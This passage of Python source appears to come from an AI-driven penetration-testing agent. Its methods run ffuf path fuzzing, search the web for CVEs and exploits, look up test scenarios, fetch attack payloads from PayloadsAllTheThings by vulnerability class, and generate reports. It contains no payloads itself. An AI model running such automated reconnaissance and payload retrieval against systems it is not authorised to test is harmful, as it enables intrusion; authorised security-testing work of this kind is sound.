        wordlist = "/usr/share/seclists/Discovery/Web-Content/common.txt"
        # shlex.quote prevents shell injection in the URL argument
        quoted_url = shlex.quote(f"{clean_url}/FUZZ")
        res = self.run(f"ffuf -w {wordlist} -u {quoted_url} -mc 200,301,302,403 -s 2>/dev/null")
        if res.strip():
            paths = res.strip().splitlines()
            target = self._extract_domain(url)
            for p in paths[:20]:
                self.memory.add_finding(target, "ffuf", "path", p, "Hidden path discovered")
            return f"--- FFUF DISCOVERY ---\n{len(paths)} paths found:\n" + "\n".join(paths[:40])
        return "FFUF: No notable paths found."

    # ─── WEB SEARCH ───────────────────────────────────────────────────────────

    def smart_web_search(self, query: str) -> str:
        """Real-time web search for CVEs, exploits, tech info.

        Tier-1: duckduckgo-search (ddgs) — fastest, no API key.
        Tier-2: langchain DuckDuckGoSearchRun — if ddgs unavailable.
        Tier-3: Install hint — so the caller always gets a useful string.
        """
        print(f"[*] Web search: {query}")

        hits = None

        # ── Tier 1: ddgs (package renamed from duckduckgo_search) ─────────────
        try:
            try:
                from ddgs import DDGS               # new package name
            except ImportError:
                from duckduckgo_search import DDGS  # legacy fallback
            with DDGS() as ddgs:
                hits = list(ddgs.text(query, max_results=8))
        except ImportError:
            pass
        except Exception as e1:
            print(f"[!] ddgs error: {e1}")

        # ── Tier 2: langchain DuckDuckGoSearchRun ─────────────────────────────
        if hits is None:
            try:
                from langchain_community.tools import DuckDuckGoSearchRun
                searcher = DuckDuckGoSearchRun()
                raw = searcher.run(query)
                if raw:
                    self.memory.upsert_entity("web_intelligence", query, {"results": raw[:500]})
                    return f"--- WEB INTELLIGENCE ---\n{raw}"
                hits = []
            except ImportError:
                pass
            except Exception as e2:
                print(f"[!] langchain ddg error: {e2}")

        # ── Tier 3: graceful degradation ──────────────────────────────────────
        if hits is None:
            return (
                "[SKIP] Web search unavailable. Install: pip install duckduckgo-search\n"
                "  Or: pip install langchain-community"
            )

        if not hits:
            return "[INFO] Web search returned no results."

        lines = []
        for h in hits:
            lines.append(
                f"[+] {h.get('title','')}\n"
                f"    {h.get('href','')}\n"
                f"    {h.get('body','')[:200]}"
            )
        results = "\n\n".join(lines)
        self.memory.upsert_entity("web_intelligence", query, {"results": results[:500]})
        return f"--- WEB INTELLIGENCE ---\n{results}"

    # ─── RAG: SCENARIO KNOWLEDGE BASE ──────────────────────────────────────────

    def retrieve_similar_scenarios(self, query: str) -> str:
        """Semantic RAG lookup over 1,040 labeled Argus test scenarios
        (core/rag_kb.py::retrieve_scenario_context — real FAISS + embeddings,
        not a keyword match). Give it the target's tech/purpose description
        (e.g. from Recon_Suite's fingerprint) and it returns the closest known
        patterns: what Argus's tools typically catch vs. miss for that kind of
        target, and what a human should additionally test. Grounds the next
        decision in calibration data instead of a guess."""
        q = (query or "").strip()
        if not q:
            return "[SKIP] No query text provided for scenario KB lookup."
        from core.rag_kb import retrieve_scenario_context
        hits = retrieve_scenario_context(q, k=3)
        if not hits:
            return ("[INFO] Scenario knowledge base unavailable or no close match. "
                     "Requires 'pip install faiss-cpu sentence-transformers' and "
                     "knowledge_base/argus_1000_scenarios.json to be present.")
        lines = [f"--- SCENARIO KB MATCHES for: {q[:120]} ---"]
        for h in hits:
            lines.append(
                f"[{h.get('category', '?')}] (similarity {h.get('_similarity', '?')})\n"
                f"  Pattern : {h.get('target', '')}\n"
                f"  Argus   : {h.get('argus_behavior', '')}\n"
                f"  Guidance: {h.get('agent_note', '')}"
            )
        return "\n\n".join(lines)

    # ─── MEMORY / KNOWLEDGE GRAPH ─────────────────────────────────────────────

    def get_intelligence_summary(self, _=None) -> str:
        return self.memory.get_blackboard_summary()

    def query_knowledge_graph(self, _=None) -> str:
        print("[*] Querying Knowledge Graph...")
        return self.memory.get_graph_insights()

    # ─── PAYLOAD SUGGESTER ────────────────────────────────────────────────────

    def suggest_payloads(self, vulnerability_type: str) -> str:
        """Fetches payloads from PayloadsAllTheThings on Kali."""
        MAPPING = {
            "xss": "XSS Injection", "sqli": "SQL Injection",
            "ssrf": "Server Side Request Forgery",
            "ssti": "Server Side Template Injection",
            "lfi": "File Inclusion", "rce": "Command Injection",
            "xxe": "XXE Injection", "traversal": "Directory Traversal",
            "csrf": "Cross-Site Request Forgery", "jwt": "JSON Web Token",
            "upload": "Upload Insecure Files"
        }
        # Sanitize: allow only alphanumeric + spaces -- prevent shell injection
        v_raw = vulnerability_type.lower().strip()
        v = re.sub(r'[^a-z0-9 _-]', '', v_raw)
        if not v:
            return f"[SAFETY BLOCK] Invalid vulnerability type: '{vulnerability_type}'"
        matched = next((folder for key, folder in MAPPING.items() if key in v), None)
        if not matched:
            search_res = self.run(
                f"find /opt/payloads/PayloadsAllTheThings -maxdepth 1 -type d -iname '*{v}*' 2>/dev/null"
            ).strip()
            # Never treat an error / 'not found' string as a directory name — this
            # previously produced a broken `cat` command (unmatched quote -> bash EOF).
            first_line = search_res.splitlines()[0].strip() if search_res else ""
            is_error = (not first_line) or first_line.lower().startswith("error") or any(
                s in search_res.lower()
                for s in ("no such file", "not found", "command not found")
            )
            candidate = "" if is_error else first_line.rstrip("/").split("/")[-1]
            # A real PayloadsAllTheThings folder is a plain name (letters/digits/space/_-.).
            if candidate and re.fullmatch(r"[A-Za-z0-9 _.\-]+", candidate):
                matched = candidate
            else:
                return (
                    f"No payloads found for '{vulnerability_type}'. "
                    "Ensure PayloadsAllTheThings is installed at "
                    "/opt/payloads/PayloadsAllTheThings inside Kali."
                )

        print(f"[*] Fetching payloads from: {matched}")
        # shlex.quote the whole path so spaces/special chars can never break the shell.
        quoted_path = shlex.quote(f"/opt/payloads/PayloadsAllTheThings/{matched}/README.md")
        cmd = f"cat {quoted_path} | grep -A 5 '```' | head -n 30"
        payload_data = self.run(cmd)
        reflection = f"--- SUGGESTED PAYLOADS/METHODOLOGY FOR {matched} ---\n"
        reflection += (
            payload_data
            if payload_data
            else "No sample payloads found in README. Check bypass files in that directory."
        )
        reflection += f"\nSource: PayloadsAllTheThings/{matched}"
        return reflection

    # -- REPORT GENERATION -------------------------------------------------------

    def generate_report(self, target: str = None) -> str:
        """Generates final JSON and Markdown reports from accumulated findings."""
        from reports.report_engine import ReportEngine

        if target:
            clean_target = self._extract_domain(target)
        else:
            history = self.memory.get_scan_history()
            clean_target = history[0]["target"] if history else "unknown"
            clean_target = self._extract_domain(clean_target)

        engine = ReportEngine(self.memory, self.reports_dir)
        json_path, md_path, score = engine.generate(clean_target, self.scan_mode)
        return (
            f"Reports generated for {clean_target}.\n"
            f"JSON: {json_path}\n"
            f"Markdown: {md_path}\n"
            f"Risk Score: {score}/10"
        )
